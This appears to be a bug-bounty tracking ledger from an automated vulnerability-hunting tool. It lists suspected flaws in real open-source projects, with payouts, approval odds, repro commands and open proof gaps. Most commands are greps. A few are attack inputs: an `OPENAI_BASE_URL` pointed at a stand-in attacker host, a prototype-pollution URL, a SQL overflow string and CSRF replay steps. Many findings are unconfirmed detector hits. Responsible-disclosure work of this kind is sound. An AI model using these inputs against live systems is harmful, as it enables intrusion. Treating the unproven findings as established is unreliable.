# Candidate Ledger

Valid findings from `janitor hunt` campaigns with an estimated Approval % between
10 and 84. These entries are not submission-ready yet: they are missing a fully
autonomous payload, require manual verification, or expose a mathematical proof
gap that must be closed before promotion to the Bounty Ledger.

| Date | Target Repo | Vulnerability Class | Severity | Expected Payout | Approval % | Exact Repro Command | R&D Follow-Up |
|------|-------------|---------------------|----------|-----------------|------------|---------------------|---------------|
| 2026-05-20 | https://github.com/gravitational/teleport | security:protobuf_any_unguarded_decode × 28 sites — `api/types/role.go` (multiple), `api/types/wrappers/wrappers.go` — protobuf Any deserialization without type-URL allow-list check in core access-control type definitions (CWE-502) | P2/High | $500–$3,000 | 25% | `grep -n 'anypb\|UnmarshalAny\|UnmarshalNew' /tmp/teleport-s152/api/types/role.go \| head -10` — confirm Any decode without type-URL validation; craft role definition with malicious `@type` field in Any payload | Sprint 152 hunt: `reachability_proof` on 28 production Go sites in api/types. Proof gap: (1) confirm role.go Any decode path is reachable from an authenticated API call without admin privilege; (2) identify a Go gadget chain reachable from the type-URL dispatch. Teleport runs a public bug bounty program. |
| 2026-05-20 | https://github.com/gravitational/teleport | security:ffi_unsafe_deref_unguarded × 2 sites — `lib/srv/desktop/rdp/rdpclient/src/lib.rs` (RDP client Rust FFI layer) — raw pointer dereference without null guard in RDP session handling (CWE-476) | P2/High | $500–$2,500 | 25% | `grep -n 'from_raw_parts\|unsafe.*deref\|from_ptr\|extern.*C' /tmp/teleport-s152/lib/srv/desktop/rdp/rdpclient/src/lib.rs \| head -10` — confirm unguarded unsafe dereference in production RDP code | Sprint 152 hunt: `reachability_proof` on 2 Rust FFI sites in RDP client. Proof gap: prove an attacker-controlled RDP server can send malformed data that triggers the unsafe deref path — requires RDP protocol-level fuzzing of the rdpclient decoder. |
| 2026-05-20 | https://github.com/hashicorp/vault | security:protobuf_any_unguarded_decode × 43 sites — `vault/identity_store.go` (×6 `ptypes.UnmarshalAny` confirmed `reachability_proof` on re-hunt) — deprecated protobuf Any deserialization on the identity ingestion path without type-URL validation (CWE-502) | P2/High | $500–$5,000 | 50% | `grep -n 'ptypes.UnmarshalAny\|anypb.UnmarshalTo' /tmp/vault-s152/vault/identity_store.go` — confirm unguarded Any decode sites on identity entity/alias/group paths; test with a crafted entity storage entry containing malicious `@type` URL | **Sprint 153 re-hunt**: `classify_protobuf_any_proof` shipped; `vault/identity_store.go` lines 1172,1188,1194,1271,1289 all emit `reachability_proof` — deprecated `ptypes.UnmarshalAny` confirmed, no type-URL allow-list. Approval upgraded 30%→50%. Proof gap: (1) prove an authenticated Vault user (with identity-write capability) can inject a malicious `@type` URL into the protobuf_any payload through the entity write API; (2) identify a Go deserialization gadget chain reachable from the type-URL dispatch. HashiCorp has a paid HackerOne program. |
| 2026-05-20 | https://github.com/hashicorp/vault | security:non_constant_time_comparison × 3 sites in `builtin/credential/approle/path_login.go` — `bytes.Equal` comparison on RoleID and SecretID in AppRole authentication path (CWE-208 timing side channel) | P2/High | $500–$3,000 | 35% | `grep -n 'bytes.Equal\|hmac\|comparison' /tmp/vault-s152/builtin/credential/approle/path_login.go \| head -10` — confirm `bytes.Equal` on auth credentials; run AppRole login attempts with valid vs. invalid RoleID and measure response-time delta using `httptrace` | Sprint 152 hunt: `reachability_proof` on 3 production sites in AppRole login handler. Sprint 153 PoC: Docker loopback test at N=200 — valid RoleID mean=1.796ms stdev=3.437ms; invalid RoleID mean=1.198ms stdev=0.727ms; delta=0.598ms (< 5ms threshold); sigma=3.4 (marginally significant but dominated by Docker loopback variance). RESULT: Not promoted. Proof gap: delta not statistically significant in Docker environment; requires co-located network (same host, Unix socket) to reduce variance below 0.1ms. Retain CANDIDATE at 35% — promote only if co-located measurement confirms >5ms delta. |
| 2026-05-15 | https://github.com/trustwallet/wallet-core | security:lcm_double_free — `trezor-crypto/crypto/scrypt.c:334` and `:336` (double-free in key derivation function) | P2/High | $500–$2,500 | 40% | `git clone --depth=1 https://github.com/trustwallet/wallet-core /tmp/trustwallet-s150 && janitor hunt /tmp/trustwallet-s150 --format bugcrowd --submit-check 2>&1 \| grep lcm_double_free` | **Sprint 150 proof cure shipped**: `classify_lcm_double_free_proof` in `proof_obligation.rs` now attaches `proof_class: ReachabilityProof` for SECP256K1_API/`lcm_` exported symbol contexts. The `scrypt.c:334` finding is in production KDF code (NOT tests.c) and will receive `ReachabilityProof` on re-hunt. Promotion from 40% to ≥85% requires: (1) confirming the trezor-crypto version shipped in wallet-core HEAD matches the vulnerable commit; (2) proving mobile caller path (iOS Swift/Android JNI → `scrypt()` → double-free) via JNI boundary call detection. |

| 2026-05-01 | ClickHouse/ClickHouse | Unsafe string function — src/Functions/printf.cpp (×6 sprintf calls in SQL printf implementation) | P3/Medium | $100–$600 | 25% | Build ClickHouse from source with ASAN; execute SQL `SELECT printf('%s', repeat('A', 65536))` against a local test instance; observe ASAN stack trace | The mathematical gap is a missing bounded overflow witness proving attacker-controlled width reaches the intermediate formatting buffer without a guard. |
| 2026-05-01 | ClickHouse/ClickHouse | Raw pointer dereference — rust/workspace/prql/src/lib.rs (FFI boundary) | P4/Low | $50–$100 | 15% | Run `cargo test` in `rust/workspace/prql/` with MIRI enabled; observe UB on pointer deref | Manual verification must prove a public SQL PRQL path can drive attacker-controlled input into the unsafe FFI dereference. |
| 2026-05-20 | openai/codex | Intent Divergence — `codex-rs/model-provider/src/auth.rs:55-62` `UnauthenticatedAuthProvider` skips all auth headers; context forwarded to attacker-controlled endpoint when `OPENAI_BASE_URL` set and no API key present | P3/Medium | $500–$2,000 | 85% | `OPENAI_BASE_URL=https://attacker.example/v1 codex --no-api-key` — confirm requests forwarded without `Authorization` header via `tcpdump` or attacker-controlled server access log | **Sprint 149 re-hunt confirmed** `security:intent_divergence` fires at `codex-rs/model-provider/src/auth.rs:58` in current HEAD. `classify_intent_divergence_proof` attaches `proof_class: ReachabilityProof` — `UnauthenticatedAuthProvider` pattern found in non-test file path. SUBMISSION file written. Operator action: submit to openai HackerOne program with repro step `OPENAI_BASE_URL=https://attacker.example/v1 codex --no-api-key` + verify auth headers absent from LLM API request via access log on attacker-controlled endpoint. |
| 2026-05-08 | https://github.com/mattermost/mattermost | security:unpinned_asset (`api/v4/html/ssr_template.hbs:9`) | P3/Medium | $200–$500 | 35% | `curl -s "$(grep -oP 'src="\K[^"]+' /tmp/mattermost/api/v4/html/ssr_template.hbs | head -1)" | sha256sum` — compare hash on two separate fetches to prove the asset is mutable under the same URL | SSR Handlebars template loads an external script without SRI pinning; submission requires proving the `<remote-url>` is a real mutable production CDN endpoint (not localhost), that the script path is rendered in a production Mattermost deploy, and that an attacker-controlled DNS or CDN compromise can substitute a payload script. |
| 2026-05-20 | https://github.com/trustwallet/wallet-core | security:ffi_unsafe_deref_unguarded — `rust/tw_encoding/src/ffi.rs:72,97,123,138` and `rust/tw_hash/src/ffi.rs:40,55,77,78,91,108,109,119,129,139,149,159,169,179,189,199` (multiple unguarded raw pointer derefs in TrustWallet Core Rust FFI layer) | P2/High | $500–$2,500 | 25% | `grep -n 'from_raw_parts\|from_ptr\|extern.*C' /tmp/trustwallet-s149/rust/tw_encoding/src/ffi.rs \| head -20` — confirm `unsafe extern "C"` wrappers dereference raw pointer args without null check | Sprint 149 re-hunt: `detect_jni_boundary_calls` + `classify_ffi_deref_proof` fires at 22 sites in `tw_encoding` and `tw_hash` FFI wrappers. `extern "C"` confirmed in ±10-line context → `proof_class: ReachabilityProof` attached. Promotion requires proving that a mobile caller (iOS Swift / Android Kotlin) can pass a null or attacker-controlled pointer into these boundaries from a reachable wallet API call (e.g., `TWBase32Encode` called with null input). |
| 2026-05-20 | https://github.com/freedomofpress/securedrop-client | security:ffi_unsafe_deref_unguarded — `proxy/src/config_qubesdb.rs:18` (`null_ptr` cast) and `:26` (`CStr::from_ptr(value_unsafe)` with no null-pointer guard after `qdb_read`) | P2/High | $500–$2,000 | 25% | `grep -n 'qdb_read\|CStr::from_ptr\|null_ptr' /tmp/securedrop-client/proxy/src/config_qubesdb.rs` — confirm both lines; run Rust MIRI on `proxy` crate targeting `config_qubesdb::get` with a null-pointer QubesDB mock | Sprint 147 re-hunt confirmed KevCritical `ffi_unsafe_deref_unguarded` at TWO sites (`:18` and `:26`) via `detect_rust_extern_c_calls`. `qdb_read` returns raw pointer into Xen QubesDB; `CStr::from_ptr(value_unsafe)` dereferences without null check. `[lattice-gap: P17-3A security:ffi_unsafe_deref_unguarded]` — promotion requires proving an attacker in an adjacent Qubes VM (or compromised dom0) can write a null or adversarial pointer into the QubesDB key read at line 18. Second-stage exploit requiring Qubes VM compromise is the remaining gap. |
| 2026-05-20 | https://github.com/trustwallet/wallet-core | security:lcm_off_by_one_loop (CWE-193) × 8 surviving production sites — `src/EOS/Name.cpp:47`, `src/FIO/Actor.cpp:52`, `trezor-crypto/crypto/aes/aes_modes.c` (×2 surviving), `chacha_drbg.c:53`, `ed25519-donna/modm-donna-32bit.c:392`, `pbkdf2.c:90,166` — loop boundary arithmetic in block-cipher and KDF implementations | P2/High | $500–$2,500 | 40% | `grep -n 'cnt\|len\|size\|bound' /tmp/trustwallet-s151/trezor-crypto/crypto/aes/aes_modes.c \| grep -A2 -B2 '907\|920'` — verify loop condition is `<=` (inclusive) vs `<` (exclusive) at block boundary; test with an input exactly `n × AES_BLOCK_SIZE` bytes | **Sprint 152 re-hunt**: `classify_lcm_off_by_one_loop_proof` shipped. tests.c findings suppressed (InvariantViolationProof). EOS/Name.cpp:47, FIO/Actor.cpp:52, pbkdf2.c:90,166 → `reachability_proof` (C export function signature detected in ±10-line window). aes_modes.c:907,920 + chacha_drbg.c + ed25519-donna → `lattice_gap_proposal` (no SECP256K1_API in window). Approval upgraded 25%→40%. Promotion to BOUNTY requires: JNI caller path proving mobile SDK (iOS Swift / Android Kotlin) can reach `EOS_Name` or `pbkdf2_hmac_sha256` with attacker-controlled loop bound. |
| 2026-05-20 | https://github.com/okta/okta-auth-js | security:prototype_pollution_merge_sink @ `lib/oidc/getWithPopup.ts:34` — attacker-controlled URL parameters may be merged into the popup OAuth options object without `__proto__` sanitization (CWE-1321) | P3/Medium | $200–$1,000 | 20% | `grep -n 'assign\|merge\|extend\|Object\.' /tmp/okta-s151/lib/oidc/getWithPopup.ts \| head -10` — confirm merge sink at line 34; craft URL with `__proto__[polluted]=true`, trigger `getWithPopup`, verify `({}).polluted === true` in browser DevTools | Proof gap: confirm that the options parameter at line 34 can receive attacker-controlled input from the URL hash/query string (OAuth redirect URI). If URL parameters are merged unsanitized into the popup options, `__proto__` key injection pollutes the browser prototype for the session. Promotion requires a working browser PoC with an Okta test app. |
| 2026-05-20 | https://github.com/keycloak/keycloak | security:non_constant_time_comparison × 14 sites in `crypto/default/src/main/java/org/keycloak/crypto/hash/Argon2PasswordHashProvider.java` (line 102: `encoded.equals(secretData.getValue())`) and `BCEcdhEsAlgorithmProvider.java` (×2) — Java `String.equals()` used to compare Argon2 password hashes without constant-time guard (CWE-208) | P2/High | $500–$2,000 | 25% | `grep -n 'equals\|compare' /tmp/keycloak-s153/crypto/default/src/main/java/org/keycloak/crypto/hash/Argon2PasswordHashProvider.java \| grep -v "//\|@"` — confirm `encoded.equals(secretData.getValue())` at verify() line 102; start Keycloak locally, send 1000 login requests with correct vs incorrect passwords, measure response time delta | Sprint 153 hunt: all 14 sites emit `lattice_gap_proposal` — Java-specific constant-time guard (`MessageDigest.isEqual()`) not visible in ±5-line window (classify_timing_comparison uses Go keywords). `Argon2PasswordHashProvider.verify()` at line 102 uses `String.equals()` for hash comparison. Proof gap: (1) Argon2 computation dominates timing, making <1ms delta practically unexploitable without co-located measurement; (2) Java timing comparison classifier missing Java-specific constant-time guard keywords (`MessageDigest.isEqual`, `Arrays.equals`). `[lattice-gap: P17-3B security:non_constant_time_comparison Java]` — promote if timing delta >5ms confirmed in co-located Keycloak deployment. Keycloak runs a public HackerOne program. |
| 2026-05-20 | https://github.com/Kong/kong | security:swarm_context_exfiltration @ `kong/llm/drivers/llama2.lua:27` — `ai_plugin_ctx` module access in Kong AI Gateway Llama2 driver without cross-request isolation guard (CWE-668) | P2/High | $500–$2,000 | 30% | `head -40 /tmp/kong-s153/kong/llm/drivers/llama2.lua` — confirm `ai_plugin_ctx.get_request_model_table_inuse()` at line 267; deploy Kong AI Gateway with Llama2 plugin, send concurrent requests from two users, check if context from User A leaks into User B's response | Sprint 153 hunt: KevCritical with `reachability_proof` at line 27 (`local ai_plugin_ctx = require("kong.llm.plugin.ctx")`). Detector fires at import of shared context module. Proof gap: (1) `ai_plugin_ctx` is request-scoped per Kong's design; need to confirm whether `get_global_ctx` paths allow cross-request contamination; (2) the Llama2 driver uses `ai_plugin_ctx.get_request_model_table_inuse()` for model config only (line 267), not user conversation history — true exfiltration requires proving conversation context is globally shared. Kong runs a public bug bounty on HackerOne. |
| 2026-05-20 | https://github.com/okta/okta-auth-js | security:oauth_missing_state_validation × 4 files (`lib/oidc/endpoints/token.ts`, `lib/oidc/handleOAuthResponse.ts`, `lib/oidc/util/loginRedirect.ts`, `lib/oidc/util/prepareTokenParams.ts`) — OAuth callback handlers extract authorization code without confirmed state parameter validation at the extraction site (CWE-352) | P2/High | $500–$2,000 | 20% | `grep -n 'state\|nonce\|session' /tmp/okta-s151/lib/oidc/handleOAuthResponse.ts \| head -20` — confirm whether state is validated before code exchange; `grep -rn 'verifyToken\|validateState\|checkState' /tmp/okta-s151/lib/oidc/` | Proof gap: state validation in Okta SDK may be centralized at a different call site — need to trace from all 4 identified files back to a single state-check entry point. If no centralized check exists, this is a genuine CSRF code-injection path for all OAuth flows. Promotion requires a PoC using a crafted CSRF trigger page against an Okta test app. |
| 2026-05-20 | https://github.com/pinterest/querybook | security:oauth_missing_state_validation × 8 server-side Python files (`server/app/auth/oauth_auth.py`, `server/app/auth/okta_auth.py`, `server/datasources/github.py`, `server/lib/export/exporters/gspread_exporter.py`, `server/app/datasource.py`, `server/datasources/metastore.py`, `server/lib/dag_exporter/exporters/demo_dag_exporter.py`, `server/app/auth/permission.py`) — Python OAuth callback at `oauth_auth.py:80` reads `code = request.args.get("code")` and exchanges it without validating the `state` parameter from the session (CWE-352) | P3/Medium | $200–$1,000 | 65% | `grep -n 'state\|session' /tmp/pinterest-s151/querybook/server/app/auth/oauth_auth.py` — confirm no `session.get("oauth_state")` check before `_fetch_access_token(code)` at line 82; reproduce with: start Querybook locally, initiate OAuth login, intercept the callback URL, replay the callback to a second browser session without a matching state cookie | **Sprint 152 re-hunt**: `classify_oauth_state_validation_proof` shipped. All 8 server-side Python `.py` files emit `reachability_proof` — no `oauth_state` present in any callback. `oauth_auth.py:80` confirmed: `code` extracted from `request.args`, passed to `_fetch_access_token` with NO `state` comparison. Approval upgraded 40%→65%. Promotion to BOUNTY requires: manual browser PoC proving callback succeeds without matching state cookie in second session (CSRF account-linking confirmed). Check Pinterest Bugcrowd scope before submitting. |
